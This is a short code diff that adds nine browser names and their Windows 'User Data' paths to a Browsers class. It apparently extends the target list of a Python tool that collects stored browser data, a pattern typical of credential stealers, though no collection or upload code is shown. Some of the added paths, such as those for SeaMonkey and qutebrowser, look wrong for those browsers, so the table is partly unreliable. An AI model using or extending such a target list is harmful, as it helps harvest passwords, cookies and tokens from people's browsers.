@@ -453,7 +453,17 @@ class Browsers:
             'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
             'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
             'iridium': self.appdata + '\\Iridium\\User Data',
+            'opera': self.appdata + '\\Opera\\User Data',
+            'opera-gx': self.appdata + '\\Opera GX\\User Data',
+            'slimjet': self.appdata + '\\Slimjet\\User Data',
+            'seamonkey': self.appdata + '\\SeaMonkey\\User Data',
+            'torch-browser': self.appdata + '\\Torch Browser\\User Data',
+            'maxthon': self.appdata + '\\Maxthon\\User Data',
+            'avast-secure-browser': self.appdata + '\\Avast Secure Browser\\User Data',
+            'qutebrowser': self.appdata + '\\Qutebrowser\\User Data',
+            'unbound-browser': self.appdata + '\\Unbound Browser\\User Data',
         }
+
 
         self.profiles = [
             'Default',
